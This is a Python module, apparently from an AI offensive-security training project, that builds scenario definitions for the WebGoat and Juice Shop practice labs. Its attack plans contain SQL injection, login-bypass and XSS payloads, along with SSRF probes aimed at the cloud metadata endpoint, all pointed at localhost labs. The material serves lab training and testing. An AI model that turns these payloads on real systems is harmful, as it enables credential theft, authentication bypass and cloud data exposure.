"""
Standard Scenario Manager - OWASP 靶場場景管理器

負責管理標準靶場場景的定義、加載、驗證和執行，用於 AI 模型訓練和測試

場景來源：
- OWASP WebGoat
- OWASP Juice Shop
- DVWA (Damn Vulnerable Web Application)
- 自定義靶場

功能：
1. 場景定義和元數據管理
2. 場景驗證和健康檢查
3. 場景執行和結果收集
4. 場景難度評估和分級
5. 訓練數據集構建
"""

from __future__ import annotations

from datetime import UTC, datetime
import json
import logging
from pathlib import Path
from typing import Any
from uuid import uuid4

from services.aiva_common.enums import VulnerabilityType
from services.aiva_common.schemas import (
    AttackPlan,
    AttackStep,
    StandardScenario,
)

logger = logging.getLogger(__name__)


class ScenarioManager:
    """OWASP 靶場場景管理器

    管理所有訓練場景，包括場景定義、驗證、執行和評估
    """

    def __init__(
        self,
        scenarios_dir: Path | None = None,
        storage_backend: Any | None = None,
    ) -> None:
        """初始化場景管理器

        Args:
            scenarios_dir: 場景定義文件目錄
            storage_backend: 儲存後端
        """
        self.scenarios_dir = scenarios_dir or Path("./data/scenarios")
        self.scenarios_dir.mkdir(parents=True, exist_ok=True)
        self.storage = storage_backend

        # 場景緩存
        self.scenarios: dict[str, StandardScenario] = {}

        # 難度級別定義
        self.difficulty_scores = {
            "easy": 1.0,
            "medium": 2.0,
            "hard": 3.0,
            "expert": 4.0,
        }

        logger.info(
            f"ScenarioManager initialized with scenarios_dir={self.scenarios_dir}"
        )

    async def create_scenario(
        self,
        name: str,
        description: str,
        vulnerability_type: VulnerabilityType,
        difficulty_level: str,
        target_config: dict[str, Any],
        expected_plan: AttackPlan,
        success_criteria: dict[str, Any],
        tags: list[str] | None = None,
        metadata: dict[str, Any] | None = None,
    ) -> StandardScenario:
        """創建標準場景

        Args:
            name: 場景名稱
            description: 場景描述
            vulnerability_type: 漏洞類型
            difficulty_level: 難度級別
            target_config: 靶場配置
            expected_plan: 預期攻擊計畫
            success_criteria: 成功標準
            tags: 標籤
            metadata: 元數據

        Returns:
            標準場景
        """
        scenario_id = f"scenario_{uuid4().hex[:12]}"

        scenario = StandardScenario(
            scenario_id=scenario_id,
            name=name,
            description=description,
            vulnerability_type=vulnerability_type,
            difficulty_level=difficulty_level,
            target_config=target_config,
            expected_plan=expected_plan,
            success_criteria=success_criteria,
            tags=tags or [],
            created_at=datetime.now(UTC),
            metadata=metadata or {},
        )

        # 添加自動生成的元數據
        scenario.metadata.update(
            {
                "steps_count": len(expected_plan.steps),
                "has_dependencies": bool(expected_plan.dependencies),
                "estimated_duration": self._estimate_duration(expected_plan),
                "difficulty_score": self.difficulty_scores.get(difficulty_level, 1.0),
            }
        )

        # 保存場景
        await self.save_scenario(scenario)

        logger.info(
            f"Created scenario {scenario_id}: {name} "
            f"({vulnerability_type.value}, {difficulty_level})"
        )

        return scenario

    async def save_scenario(self, scenario: StandardScenario) -> None:
        """保存場景

        Args:
            scenario: 標準場景
        """
        # 保存到緩存
        self.scenarios[scenario.scenario_id] = scenario

        # 保存到文件系統
        file_path = self.scenarios_dir / f"{scenario.scenario_id}.json"
        with open(file_path, "w", encoding="utf-8") as f:
            json.dump(scenario.model_dump(), f, indent=2, default=str)

        # 保存到資料庫
        if self.storage and hasattr(self.storage, "save_scenario"):
            try:
                await self.storage.save_scenario(scenario.model_dump())
                logger.debug(f"Saved scenario {scenario.scenario_id} to database")
            except Exception as e:
                logger.error(f"Failed to save scenario to database: {e}")

    async def load_scenario(self, scenario_id: str) -> StandardScenario | None:
        """加載場景

        Args:
            scenario_id: 場景 ID

        Returns:
            場景，不存在則返回 None
        """
        # 先檢查緩存
        if scenario_id in self.scenarios:
            return self.scenarios[scenario_id]

        # 從資料庫加載
        if self.storage and hasattr(self.storage, "get_scenario"):
            try:
                data = await self.storage.get_scenario(scenario_id)
                if data:
                    scenario = StandardScenario(**data)
                    self.scenarios[scenario_id] = scenario
                    return scenario
            except Exception as e:
                logger.error(f"Failed to load scenario from database: {e}")

        # 從文件加載
        file_path = self.scenarios_dir / f"{scenario_id}.json"
        if file_path.exists():
            try:
                with open(file_path, encoding="utf-8") as f:
                    data = json.load(f)
                scenario = StandardScenario(**data)
                self.scenarios[scenario_id] = scenario
                return scenario
            except Exception as e:
                logger.error(f"Failed to load scenario from file: {e}")

        return None

    async def list_scenarios(
        self,
        vulnerability_type: VulnerabilityType | None = None,
        difficulty_level: str | None = None,
        tags: list[str] | None = None,
    ) -> list[StandardScenario]:
        """列出場景

        Args:
            vulnerability_type: 漏洞類型過濾
            difficulty_level: 難度過濾
            tags: 標籤過濾

        Returns:
            場景列表
        """
        # 確保所有場景都已加載
        await self._load_all_scenarios()

        scenarios = list(self.scenarios.values())

        # 應用過濾
        if vulnerability_type:
            scenarios = [
                s for s in scenarios if s.vulnerability_type == vulnerability_type
            ]

        if difficulty_level:
            scenarios = [s for s in scenarios if s.difficulty_level == difficulty_level]

        if tags:
            scenarios = [s for s in scenarios if any(tag in s.tags for tag in tags)]

        return scenarios

    async def _load_all_scenarios(self) -> None:
        """加載所有場景到緩存"""
        for file_path in self.scenarios_dir.glob("*.json"):
            scenario_id = file_path.stem
            if scenario_id not in self.scenarios:
                await self.load_scenario(scenario_id)

    async def validate_scenario(self, scenario: StandardScenario) -> dict[str, Any]:
        """驗證場景配置

        Args:
            scenario: 標準場景

        Returns:
            驗證結果
        """
        validation_result = {
            "scenario_id": scenario.scenario_id,
            "valid": True,
            "errors": [],
            "warnings": [],
        }

        # 1. 檢查目標配置
        if not scenario.target_config:
            validation_result["errors"].append("目標配置為空")
            validation_result["valid"] = False
        else:
            # 檢查必要欄位
            required_fields = ["base_url", "type"]
            for field in required_fields:
                if field not in scenario.target_config:
                    validation_result["errors"].append(f"目標配置缺少 {field}")
                    validation_result["valid"] = False

        # 2. 檢查攻擊計畫
        if not scenario.expected_plan.steps:
            validation_result["errors"].append("攻擊計畫沒有步驟")
            validation_result["valid"] = False

        # 檢查步驟完整性
        for i, step in enumerate(scenario.expected_plan.steps):
            if not step.action:
                validation_result["errors"].append(f"步驟 {i} 缺少動作描述")
                validation_result["valid"] = False

            if not step.tool_type:
                validation_result["errors"].append(f"步驟 {i} 缺少工具類型")
                validation_result["valid"] = False

        # 3. 檢查成功標準
        if not scenario.success_criteria:
            validation_result["warnings"].append("未定義成功標準")

        # 4. 檢查依賴關係
        if scenario.expected_plan.dependencies:
            step_ids = {s.step_id for s in scenario.expected_plan.steps}
            for step_id, deps in scenario.expected_plan.dependencies.items():
                if step_id not in step_ids:
                    validation_result["errors"].append(
                        f"依賴關係引用不存在的步驟: {step_id}"
                    )
                    validation_result["valid"] = False

                for dep in deps:
                    if dep not in step_ids:
                        validation_result["errors"].append(
                            f"依賴關係引用不存在的依賴步驟: {dep}"
                        )
                        validation_result["valid"] = False

        logger.info(
            f"Validated scenario {scenario.scenario_id}: "
            f"valid={validation_result['valid']}, "
            f"errors={len(validation_result['errors'])}, "
            f"warnings={len(validation_result['warnings'])}"
        )

        return validation_result

    async def check_target_health(self, scenario: StandardScenario) -> dict[str, Any]:
        """檢查靶場目標健康狀態

        Args:
            scenario: 標準場景

        Returns:
            健康檢查結果
        """
        health_result = {
            "scenario_id": scenario.scenario_id,
            "target_url": scenario.target_config.get("base_url"),
            "healthy": False,
            "response_time_ms": 0,
            "status_code": None,
            "error": None,
            "checked_at": datetime.now(UTC).isoformat(),
        }

        try:
            import httpx

            base_url = scenario.target_config.get("base_url")
            if not base_url:
                health_result["error"] = "未配置 base_url"
                return health_result

            # 執行健康檢查
            async with httpx.AsyncClient(timeout=10.0) as client:
                start_time = datetime.now(UTC)
                response = await client.get(base_url)
                end_time = datetime.now(UTC)

                health_result["status_code"] = response.status_code
                health_result["response_time_ms"] = (
                    end_time - start_time
                ).total_seconds() * 1000
                health_result["healthy"] = 200 <= response.status_code < 400

        except Exception as e:
            health_result["error"] = str(e)
            logger.error(f"Health check failed for {scenario.scenario_id}: {e}")

        return health_result

    def _estimate_duration(self, plan: AttackPlan) -> float:
        """估算計畫執行時間

        Args:
            plan: 攻擊計畫

        Returns:
            估算時間（秒）
        """
        # 基礎時間：每個步驟 5 秒
        base_time = len(plan.steps) * 5.0

        # 考慮步驟超時設置
        timeout_sum = sum(step.timeout_seconds for step in plan.steps)

        # 返回較大值
        return max(base_time, timeout_sum * 0.5)

    async def create_owasp_webgoat_scenarios(self) -> list[StandardScenario]:
        """創建 OWASP WebGoat 標準場景集

        Returns:
            場景列表
        """
        scenarios = []

        # 1. SQL 注入場景 - 簡單
        sql_easy = await self.create_scenario(
            name="WebGoat - SQL Injection (String)",
            description="WebGoat SQL 注入練習 - 字串型注入",
            vulnerability_type=VulnerabilityType.SQLI,
            difficulty_level="easy",
            target_config={
                "type": "webgoat",
                "base_url": "http://localhost:8080/WebGoat",
                "lesson": "SqlInjection",
                "challenge": "SqlInjectionLesson5a",
                "parameters": {"userid": {"type": "string", "injectable": True}},
            },
            expected_plan=self._create_sql_injection_plan_easy(),
            success_criteria={
                "must_find_vulnerability": True,
                "min_confidence": 0.8,
                "required_evidence": ["sql_error", "data_extraction"],
                "max_attempts": 20,
            },
            tags=["owasp", "webgoat", "sqli", "beginner"],
        )
        scenarios.append(sql_easy)

        # 2. SQL 注入場景 - 中等
        sql_medium = await self.create_scenario(
            name="WebGoat - SQL Injection (Numeric)",
            description="WebGoat SQL 注入練習 - 數字型注入",
            vulnerability_type=VulnerabilityType.SQLI,
            difficulty_level="medium",
            target_config={
                "type": "webgoat",
                "base_url": "http://localhost:8080/WebGoat",
                "lesson": "SqlInjection",
                "challenge": "SqlInjectionLesson5b",
                "parameters": {"userid": {"type": "numeric", "injectable": True}},
            },
            expected_plan=self._create_sql_injection_plan_medium(),
            success_criteria={
                "must_find_vulnerability": True,
                "min_confidence": 0.85,
                "required_evidence": [
                    "sql_error",
                    "data_extraction",
                    "bypass_authentication",
                ],
                "max_attempts": 30,
            },
            tags=["owasp", "webgoat", "sqli", "intermediate"],
        )
        scenarios.append(sql_medium)

        # 3. XSS 場景 - 簡單
        xss_easy = await self.create_scenario(
            name="WebGoat - XSS (Reflected)",
            description="WebGoat XSS 練習 - 反射型 XSS",
            vulnerability_type=VulnerabilityType.XSS,
            difficulty_level="easy",
            target_config={
                "type": "webgoat",
                "base_url": "http://localhost:8080/WebGoat",
                "lesson": "CrossSiteScripting",
                "challenge": "CrossSiteScriptingLesson2a",
                "parameters": {"search": {"type": "string", "injectable": True}},
            },
            expected_plan=self._create_xss_plan_easy(),
            success_criteria={
                "must_find_vulnerability": True,
                "min_confidence": 0.75,
                "required_evidence": ["script_reflection", "alert_execution"],
                "max_attempts": 15,
            },
            tags=["owasp", "webgoat", "xss", "beginner"],
        )
        scenarios.append(xss_easy)

        # 4. SSRF 場景 - 中等
        ssrf_medium = await self.create_scenario(
            name="WebGoat - SSRF",
            description="WebGoat SSRF 練習 - 服務端請求偽造",
            vulnerability_type=VulnerabilityType.SSRF,
            difficulty_level="medium",
            target_config={
                "type": "webgoat",
                "base_url": "http://localhost:8080/WebGoat",
                "lesson": "SSRF",
                "challenge": "SSRFLesson2",
                "parameters": {"url": {"type": "url", "injectable": True}},
            },
            expected_plan=self._create_ssrf_plan_medium(),
            success_criteria={
                "must_find_vulnerability": True,
                "min_confidence": 0.8,
                "required_evidence": ["internal_access", "response_reflection"],
                "max_attempts": 25,
            },
            tags=["owasp", "webgoat", "ssrf", "intermediate"],
        )
        scenarios.append(ssrf_medium)

        logger.info(f"Created {len(scenarios)} WebGoat scenarios")
        return scenarios

    async def create_juice_shop_scenarios(self) -> list[StandardScenario]:
        """創建 OWASP Juice Shop 標準場景集

        Returns:
            場景列表
        """
        scenarios = []

        # 1. SQL 注入 - 登入繞過
        sql_login = await self.create_scenario(
            name="Juice Shop - SQL Injection Login Bypass",
            description="Juice Shop SQL 注入 - 繞過登入驗證",
            vulnerability_type=VulnerabilityType.SQLI,
            difficulty_level="medium",
            target_config={
                "type": "juiceshop",
                "base_url": "http://localhost:3000",
                "endpoint": "/rest/user/login",
                "method": "POST",
                "parameters": {
                    "email": {"type": "string", "injectable": True},
                    "password": {"type": "string", "injectable": True},
                },
            },
            expected_plan=self._create_juice_shop_sql_login_plan(),
            success_criteria={
                "must_find_vulnerability": True,
                "min_confidence": 0.9,
                "required_evidence": ["authentication_bypass", "admin_access"],
                "success_indicators": ["token", "admin"],
                "max_attempts": 15,
            },
            tags=["owasp", "juiceshop", "sqli", "authentication"],
        )
        scenarios.append(sql_login)

        # 2. XSS - DOM Based
        xss_dom = await self.create_scenario(
            name="Juice Shop - DOM-based XSS",
            description="Juice Shop DOM-based XSS 漏洞",
            vulnerability_type=VulnerabilityType.XSS,
            difficulty_level="hard",
            target_config={
                "type": "juiceshop",
                "base_url": "http://localhost:3000",
                "endpoint": "/#/search",
                "parameters": {
                    "q": {"type": "string", "injectable": True, "context": "dom"}
                },
            },
            expected_plan=self._create_juice_shop_xss_dom_plan(),
            success_criteria={
                "must_find_vulnerability": True,
                "min_confidence": 0.85,
                "required_evidence": ["dom_modification", "script_execution"],
                "max_attempts": 30,
            },
            tags=["owasp", "juiceshop", "xss", "dom", "advanced"],
        )
        scenarios.append(xss_dom)

        logger.info(f"Created {len(scenarios)} Juice Shop scenarios")
        return scenarios

    def _create_sql_injection_plan_easy(self) -> AttackPlan:
        """創建簡單 SQL 注入攻擊計畫"""
        plan_id = f"plan_{uuid4().hex[:8]}"
        scan_id = f"scan_{uuid4().hex[:8]}"

        steps = [
            AttackStep(
                step_id="step_1",
                action="SQL Error Detection",
                tool_type="function_sqli",
                target={"parameter": "userid"},
                parameters={
                    "payloads": ["'", '"', "1'--", "1' OR '1'='1"],
                    "detection_method": "error_based",
                },
                expected_result="SQL error message detected",
                timeout_seconds=15.0,
            ),
            AttackStep(
                step_id="step_2",
                action="Boolean-based Blind SQLi",
                tool_type="function_sqli",
                target={"parameter": "userid"},
                parameters={
                    "payloads": ["1' AND '1'='1", "1' AND '1'='2"],
                    "detection_method": "boolean_based",
                },
                expected_result="Boolean-based injection confirmed",
                timeout_seconds=20.0,
            ),
            AttackStep(
                step_id="step_3",
                action="Data Extraction",
                tool_type="function_sqli",
                target={"parameter": "userid"},
                parameters={
                    "payloads": ["1' UNION SELECT username, password FROM users--"],
                    "detection_method": "union_based",
                },
                expected_result="Data extracted successfully",
                timeout_seconds=25.0,
            ),
        ]

        plan = AttackPlan(
            plan_id=plan_id,
            scan_id=scan_id,
            attack_type=VulnerabilityType.SQLI,
            steps=steps,
            dependencies={
                "step_2": ["step_1"],
                "step_3": ["step_2"],
            },
            metadata={"difficulty": "easy", "scenario_type": "webgoat"},
        )

        return plan

    def _create_sql_injection_plan_medium(self) -> AttackPlan:
        """創建中等難度 SQL 注入攻擊計畫"""
        plan_id = f"plan_{uuid4().hex[:8]}"
        scan_id = f"scan_{uuid4().hex[:8]}"

        steps = [
            AttackStep(
                step_id="step_1",
                action="Parameter Type Detection",
                tool_type="function_sqli",
                target={"parameter": "userid"},
                parameters={"detection": "numeric_vs_string"},
                timeout_seconds=10.0,
            ),
            AttackStep(
                step_id="step_2",
                action="Time-based Blind SQLi",
                tool_type="function_sqli",
                target={"parameter": "userid"},
                parameters={
                    "payloads": ["1 AND SLEEP(5)", "1; WAITFOR DELAY '00:00:05'--"],
                    "detection_method": "time_based",
                },
                timeout_seconds=30.0,
            ),
            AttackStep(
                step_id="step_3",
                action="Database Enumeration",
                tool_type="function_sqli",
                target={"parameter": "userid"},
                parameters={
                    "enumerate": ["database", "tables", "columns"],
                },
                timeout_seconds=40.0,
            ),
            AttackStep(
                step_id="step_4",
                action="Authentication Bypass",
                tool_type="function_sqli",
                target={"parameter": "userid"},
                parameters={
                    "payloads": ["admin' --", "admin'/*"],
                    "goal": "bypass_login",
                },
                timeout_seconds=20.0,
            ),
        ]

        plan = AttackPlan(
            plan_id=plan_id,
            scan_id=scan_id,
            attack_type=VulnerabilityType.SQLI,
            steps=steps,
            dependencies={
                "step_2": ["step_1"],
                "step_3": ["step_2"],
                "step_4": ["step_3"],
            },
            metadata={"difficulty": "medium", "scenario_type": "webgoat"},
        )

        return plan

    def _create_xss_plan_easy(self) -> AttackPlan:
        """創建簡單 XSS 攻擊計畫"""
        plan_id = f"plan_{uuid4().hex[:8]}"
        scan_id = f"scan_{uuid4().hex[:8]}"

        steps = [
            AttackStep(
                step_id="step_1",
                action="Basic XSS Detection",
                tool_type="function_xss",
                target={"parameter": "search"},
                parameters={
                    "payloads": [
                        "<script>alert(1)</script>",
                        "<img src=x onerror=alert(1)>",
                    ],
                    "detection_method": "reflection",
                },
                timeout_seconds=15.0,
            ),
            AttackStep(
                step_id="step_2",
                action="Filter Bypass",
                tool_type="function_xss",
                target={"parameter": "search"},
                parameters={
                    "payloads": ["<ScRiPt>alert(1)</ScRiPt>", "<svg onload=alert(1)>"],
                    "bypass_techniques": ["case_variation", "event_handlers"],
                },
                timeout_seconds=20.0,
            ),
        ]

        plan = AttackPlan(
            plan_id=plan_id,
            scan_id=scan_id,
            attack_type=VulnerabilityType.XSS,
            steps=steps,
            dependencies={"step_2": ["step_1"]},
            metadata={"difficulty": "easy", "scenario_type": "webgoat"},
        )

        return plan

    def _create_ssrf_plan_medium(self) -> AttackPlan:
        """創建中等難度 SSRF 攻擊計畫"""
        plan_id = f"plan_{uuid4().hex[:8]}"
        scan_id = f"scan_{uuid4().hex[:8]}"

        steps = [
            AttackStep(
                step_id="step_1",
                action="SSRF Detection",
                tool_type="function_ssrf",
                target={"parameter": "url"},
                parameters={
                    "test_urls": ["http://localhost", "http://127.0.0.1"],
                },
                timeout_seconds=15.0,
            ),
            AttackStep(
                step_id="step_2",
                action="Internal Network Scan",
                tool_type="function_ssrf",
                target={"parameter": "url"},
                parameters={
                    "scan_range": "http://127.0.0.1:8080-8090",
                },
                timeout_seconds=30.0,
            ),
            AttackStep(
                step_id="step_3",
                action="Metadata Access",
                tool_type="function_ssrf",
                target={"parameter": "url"},
                parameters={
                    "targets": ["http://169.254.169.254/latest/meta-data/"],
                },
                timeout_seconds=20.0,
            ),
        ]

        plan = AttackPlan(
            plan_id=plan_id,
            scan_id=scan_id,
            attack_type=VulnerabilityType.SSRF,
            steps=steps,
            dependencies={
                "step_2": ["step_1"],
                "step_3": ["step_1"],
            },
            metadata={"difficulty": "medium", "scenario_type": "webgoat"},
        )

        return plan

    def _create_juice_shop_sql_login_plan(self) -> AttackPlan:
        """創建 Juice Shop SQL 登入繞過計畫"""
        plan_id = f"plan_{uuid4().hex[:8]}"
        scan_id = f"scan_{uuid4().hex[:8]}"

        steps = [
            AttackStep(
                step_id="step_1",
                action="Login Form Analysis",
                tool_type="function_sqli",
                target={"endpoint": "/rest/user/login", "method": "POST"},
                parameters={
                    "analyze": ["input_validation", "error_messages"],
                },
                timeout_seconds=10.0,
            ),
            AttackStep(
                step_id="step_2",
                action="SQL Injection - Email Field",
                tool_type="function_sqli",
                target={"parameter": "email"},
                parameters={
                    "payloads": [
                        "' OR 1=1--",
                        "admin'--",
                        "' OR '1'='1'--",
                    ],
                },
                timeout_seconds=20.0,
            ),
            AttackStep(
                step_id="step_3",
                action="Authentication Bypass Verification",
                tool_type="function_sqli",
                target={"endpoint": "/rest/user/login"},
                parameters={
                    "verify": ["token_received", "admin_role"],
                },
                timeout_seconds=10.0,
            ),
        ]

        plan = AttackPlan(
            plan_id=plan_id,
            scan_id=scan_id,
            attack_type=VulnerabilityType.SQLI,
            steps=steps,
            dependencies={
                "step_2": ["step_1"],
                "step_3": ["step_2"],
            },
            metadata={"difficulty": "medium", "scenario_type": "juiceshop"},
        )

        return plan

    def _create_juice_shop_xss_dom_plan(self) -> AttackPlan:
        """創建 Juice Shop DOM XSS 計畫"""
        plan_id = f"plan_{uuid4().hex[:8]}"
        scan_id = f"scan_{uuid4().hex[:8]}"

        steps = [
            AttackStep(
                step_id="step_1",
                action="DOM Analysis",
                tool_type="function_xss",
                target={"parameter": "q", "context": "dom"},
                parameters={
                    "analyze": ["dom_sinks", "javascript_handlers"],
                },
                timeout_seconds=15.0,
            ),
            AttackStep(
                step_id="step_2",
                action="DOM-based XSS Injection",
                tool_type="function_xss",
                target={"parameter": "q"},
                parameters={
                    "payloads": [
                        "<iframe src=javascript:alert(1)>",
                        "<img src=x onerror=alert(document.domain)>",
                    ],
                    "context": "dom",
                },
                timeout_seconds=20.0,
            ),
            AttackStep(
                step_id="step_3",
                action="Execution Verification",
                tool_type="function_xss",
                target={"parameter": "q"},
                parameters={
                    "verify": ["script_executed", "dom_modified"],
                },
                timeout_seconds=15.0,
            ),
        ]

        plan = AttackPlan(
            plan_id=plan_id,
            scan_id=scan_id,
            attack_type=VulnerabilityType.XSS,
            steps=steps,
            dependencies={
                "step_2": ["step_1"],
                "step_3": ["step_2"],
            },
            metadata={"difficulty": "hard", "scenario_type": "juiceshop"},
        )

        return plan

    async def get_training_curriculum(
        self, difficulty_progression: bool = True
    ) -> list[StandardScenario]:
        """獲取訓練課程（按難度排序的場景序列）

        Args:
            difficulty_progression: 是否按難度遞增排序

        Returns:
            場景列表
        """
        scenarios = await self.list_scenarios()

        if difficulty_progression:
            # 按難度排序
            difficulty_order = {"easy": 1, "medium": 2, "hard": 3, "expert": 4}
            scenarios.sort(
                key=lambda s: (
                    difficulty_order.get(s.difficulty_level, 5),
                    s.vulnerability_type.value,
                )
            )

        return scenarios

    async def export_scenarios(self, output_path: Path, format: str = "json") -> int:
        """導出場景配置

        Args:
            output_path: 輸出路徑
            format: 導出格式

        Returns:
            導出的場景數量
        """
        scenarios = await self.list_scenarios()

        output_path.parent.mkdir(parents=True, exist_ok=True)

        if format == "json":
            data = [s.model_dump() for s in scenarios]
            with open(output_path, "w", encoding="utf-8") as f:
                json.dump(data, f, indent=2, default=str)

        logger.info(f"Exported {len(scenarios)} scenarios to {output_path}")
        return len(scenarios)

    async def get_statistics(self) -> dict[str, Any]:
        """獲取場景統計資訊

        Returns:
            統計資訊
        """
        scenarios = await self.list_scenarios()

        stats = {
            "total_scenarios": len(scenarios),
            "by_difficulty": {},
            "by_vulnerability_type": {},
            "by_tags": {},
            "average_steps": 0.0,
            "total_estimated_duration": 0.0,
        }

        if not scenarios:
            return stats

        # 難度統計
        for difficulty in ["easy", "medium", "hard", "expert"]:
            count = sum(1 for s in scenarios if s.difficulty_level == difficulty)
            stats["by_difficulty"][difficulty] = count

        # 漏洞類型統計
        for scenario in scenarios:
            vuln_type = scenario.vulnerability_type.value
            stats["by_vulnerability_type"][vuln_type] = (
                stats["by_vulnerability_type"].get(vuln_type, 0) + 1
            )

        # 標籤統計
        for scenario in scenarios:
            for tag in scenario.tags:
                stats["by_tags"][tag] = stats["by_tags"].get(tag, 0) + 1

        # 平均步驟數
        total_steps = sum(len(s.expected_plan.steps) for s in scenarios)
        stats["average_steps"] = total_steps / len(scenarios)

        # 總估算時間
        stats["total_estimated_duration"] = sum(
            s.metadata.get("estimated_duration", 0) for s in scenarios
        )

        return stats
